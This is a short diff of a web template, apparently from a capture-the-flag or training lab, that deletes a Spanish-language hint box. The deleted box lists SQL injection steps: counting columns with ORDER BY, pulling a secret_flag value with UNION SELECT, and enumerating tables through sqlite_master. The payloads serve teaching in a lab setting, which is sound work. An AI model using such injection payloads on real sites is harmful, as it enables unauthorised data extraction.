@@ -39,13 +39,5 @@
   </div>
 </div>
 
-<div class="hint-box mt-3">
-  <div class="hint-title">técnica: UNION SELECT</div>
-  <p>
-    Primero determina el número de columnas: <code>?id=1 ORDER BY 7--</code><br>
-    Luego extrae datos: <code>?id=0 UNION SELECT 1,secret_flag,3,4,5,6,7 FROM products WHERE id=3--</code><br>
-    Enumera tablas con: <code>?id=0 UNION SELECT 1,name,3,4,5,6,7 FROM sqlite_master--</code>
-  </p>
-</div>
 
 {% endblock %}
